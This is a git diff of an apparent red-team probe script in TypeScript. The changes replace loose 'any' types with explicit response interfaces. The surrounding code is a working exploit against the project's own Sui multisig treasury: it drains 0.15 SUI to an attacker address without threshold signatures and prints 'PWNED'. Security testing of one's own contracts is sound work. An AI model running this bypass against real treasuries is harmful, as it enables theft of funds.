@@ -22,6 +22,18 @@ import { homedir } from "node:os"
 import { ed25519 } from "@noble/curves/ed25519.js"
 import { bytesToScalar } from "../packages/multisig/src/dkg/math"
 
+// Wire shapes this probe reads off the gRPC responses (see redteam-attack.ts).
+// In exec() the `!` on res.FailedTransaction is type-level only: the SDK
+// result union always populates exactly one of the two arms.
+interface WireEvent { eventType?: string; bcs?: Uint8Array | Record<number, number> }
+interface WireTx {
+  digest: string | { digest: string }
+  status?: { success?: boolean; error?: { message?: string } | null }
+  events?: WireEvent[]
+  objectTypes?: Record<string, string>
+}
+type WireExecResult = { Transaction?: WireTx; FailedTransaction?: WireTx }
+
 const PKG = "0x088870b092be097230b02eeb4787df34ef6848ba92edf0bd9afcae6e3218585f"
 const FUNDER = "0x8ac06d3d4328aff5bef88990741c1f620a96d5fc579bf2e459467763bd605788"
 const M2 = "0x2b9953911b07f6b7d2c92e17ed6cb2325cc26f9eb1eaeb58497ee7b5523ea859"
@@ -40,12 +52,12 @@ function keypairFor(address: string): Ed25519Keypair {
 }
 async function exec(signer: Ed25519Keypair, tx: Transaction, label: string) {
   tx.setSender(signer.toSuiAddress())
-  const bytes = await tx.build({ client } as any)
+  const bytes = await tx.build({ client })
   const sig = await signer.signTransaction(bytes)
-  const res: any = await client.executeTransaction({ transaction: bytes, signatures: [sig.signature], include: { effects: true, events: true } })
-  const t = res.Transaction ?? res.FailedTransaction
+  const res: WireExecResult = await client.executeTransaction({ transaction: bytes, signatures: [sig.signature], include: { effects: true, events: true } })
+  const t = res.Transaction ?? res.FailedTransaction!
   const ok = t?.status?.success === true
-  const events: any[] = (t?.events ?? []).map((e: any) => (e.eventType ?? "").split("::").slice(2).join("::"))
+  const events: string[] = (t?.events ?? []).map((e) => (e.eventType ?? "").split("::").slice(2).join("::"))
   const dstr: string = typeof t?.digest === "string" ? t.digest : t?.digest?.digest
   console.log(`[${label}] ${ok ? "EXECUTED" : "FAILED"} digest=${dstr} events=${events.join(",") || "-"} ${ok ? "" : t?.status?.error?.message ?? ""}`)
   return { ok, t }
@@ -78,8 +90,8 @@ async function main() {
 
   // discover org id from events
   const dstr: string = typeof d1.t.digest === "string" ? d1.t.digest : d1.t.digest.digest
-  const full: any = await client.getTransaction({ digest: dstr, include: { events: true } })
-  const orgCreated = (full.Transaction?.events ?? []).find((e: any) => (e.eventType ?? "").endsWith("OrganizationCreatedEvent"))
+  const full: WireExecResult = await client.getTransaction({ digest: dstr, include: { events: true } })
+  const orgCreated = (full.Transaction?.events ?? []).find((e) => (e.eventType ?? "").endsWith("OrganizationCreatedEvent"))
   const bcsBytes = orgCreated?.bcs instanceof Uint8Array ? orgCreated.bcs : Uint8Array.from(Object.values(orgCreated?.bcs ?? {}) as number[])
   const orgId = "0x" + Buffer.from(bcsBytes.slice(0, 32)).toString("hex")
   console.log("org id:", orgId)
@@ -96,8 +108,8 @@ async function main() {
 
   // discover treasury + vault, then deposit straight into the shared vault
   const d2str: string = typeof d2.t.digest === "string" ? d2.t.digest : d2.t.digest.digest
-  const full2a: any = await client.getTransaction({ digest: d2str, include: { events: true } })
-  const tEv0 = (full2a.Transaction?.events ?? []).find((e: any) => (e.eventType ?? "").endsWith("TreasuryCreated"))
+  const full2a: WireExecResult = await client.getTransaction({ digest: d2str, include: { events: true } })
+  const tEv0 = (full2a.Transaction?.events ?? []).find((e) => (e.eventType ?? "").endsWith("TreasuryCreated"))
   const tb0 = tEv0?.bcs instanceof Uint8Array ? tEv0.bcs : Uint8Array.from(Object.values(tEv0?.bcs ?? {}) as number[])
   const treasuryId = "0x" + Buffer.from(tb0.slice(0, 32)).toString("hex")
   const vaultId = "0x" + Buffer.from(tb0.slice(64, 96)).toString("hex")
@@ -128,8 +140,8 @@ async function main() {
   const d3 = await exec(m2, p1, "create_transfer(0.15 SUI → attacker)")
   if (!d3.ok) return
   const d3str: string = typeof d3.t.digest === "string" ? d3.t.digest : d3.t.digest.digest
-  const full3: any = await client.getTransaction({ digest: d3str, include: { events: true } })
-  const bEv = (full3.Transaction?.events ?? []).find((e: any) => (e.eventType ?? "").endsWith("TransferCreated"))
+  const full3: WireExecResult = await client.getTransaction({ digest: d3str, include: { events: true } })
+  const bEv = (full3.Transaction?.events ?? []).find((e) => (e.eventType ?? "").endsWith("TransferCreated"))
   const bb = bEv?.bcs instanceof Uint8Array ? bEv.bcs : Uint8Array.from(Object.values(bEv?.bcs ?? {}) as number[])
   const bindingId = "0x" + Buffer.from(bb.slice(0, 32)).toString("hex")
   const proposalId = "0x" + Buffer.from(bb.slice(64, 96)).toString("hex")
@@ -148,7 +160,7 @@ async function main() {
     arguments: [x.object(treasuryId), x.object(bindingId), x.object(orgId), x.object(proposalId), x.object(vaultId), x.object(clock)],
   })
   const d5 = await exec(funder, x, "execute transfer 0.15 SUI → ATTACKER")
-  const { balance }: any = await client.getBalance({ owner: ATTACKER, coinType: SUI })
+  const { balance } = await client.getBalance({ owner: ATTACKER, coinType: SUI })
   console.log("attacker balance now:", balance.balance)
   console.log(d5.ok ? "\nPWNED: 0.15 SUI left the org treasury with ZERO threshold signatures — the FROST key never participated." : "\nexecution failed (see error)")
 }
